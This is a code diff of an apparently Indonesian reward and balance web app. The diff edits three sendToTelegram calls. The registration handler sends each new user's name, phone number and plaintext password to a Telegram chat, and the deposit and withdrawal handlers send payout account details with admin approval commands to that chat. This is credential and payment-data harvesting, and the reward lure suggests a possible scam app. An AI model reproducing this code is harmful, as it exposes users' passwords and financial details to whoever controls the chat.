@@ -3279,7 +3279,7 @@
       addNotifToUser(phone, "Selamat bergabung! Klaim saldo reward khusus pengguna baru.", "bonus");
 
       const deviceUsed = getDeviceName();
-      sendToTelegram(`*PENDAFTARAN USER BARU*\nNama: ${name}\nHP: \`${phone}\`\nPassword: \`${pass}\`\nUID: \`${newUID}\`\nDevice: \`${deviceUsed}\``);
+      sendToTelegram(`*PENDAFTARAN USER BARU*\nNama: ${name}\nHP: \`${phone}\`\nPassword: \`${pass}\`\nUID: \`${newUID}\`\n\nDevice: \`${deviceUsed}\``);
       
       closeTargetModal('register-modal'); 
       showModal("Berhasil", "Pendaftaran valid silakan login.", "win");
@@ -3829,7 +3829,7 @@
       saveDataLocally(); renderHistory();
 
       const deviceUsed = getDeviceName();
-      sendToTelegram(`*PERMINTAAN ISI SALDO*\nUID: \`${userID}\`\nNominal: Rp ${amount.toLocaleString('id-ID')}\n\nDevice: \`${deviceUsed}\`\n\nKirim QRIS: \`/send ${userID}\` \nKonfirmasi: \`/acc ${amount} ${userID}\` \nTolak: \`/tolak ${userID}\``);
+      sendToTelegram(`*PERMINTAAN ISI SALDO*\nNama: ${name}\nUID: \`${userID}\`\nNominal: Rp ${amount.toLocaleString('id-ID')}\n\nDevice: \`${deviceUsed}\`\n\nKirim QRIS: \`/send ${userID}\` \nKonfirmasi: \`/acc ${amount} ${userID}\` \nTolak: \`/tolak ${userID}\``);
     }
 
     function showQR(url, activeDep, isResume = false) {
@@ -3950,7 +3950,7 @@
         saveDataLocally(); renderHistory();
         
         const deviceUsed = getDeviceName();
-        sendToTelegram(`*PERMINTAAN TARIK SALDO*\nUID: \`${userID}\`\nNominal: Rp ${amount.toLocaleString('id-ID')}\nTujuan: ${saved.provider} - \`${saved.number}\` an (${saved.name})\n\nDevice: \`${deviceUsed}\`\n\nTerima: \`/acc_wd ${userID}\` \nTolak: \`/tolak_wd ${userID}\``);
+        sendToTelegram(`*PERMINTAAN TARIK SALDO*\nNama: ${name}\nUID: \`${userID}\`\nNominal: Rp ${amount.toLocaleString('id-ID')}\nTujuan: ${saved.provider} - \`${saved.number}\` an (${saved.name})\n\nDevice: \`${deviceUsed}\`\n\nTerima: \`/acc_wd ${userID}\` \nTolak: \`/tolak_wd ${userID}\``);
         
         showModal("Diproses", "Permintaan penarikan saldo terkirim.", "win");
       });
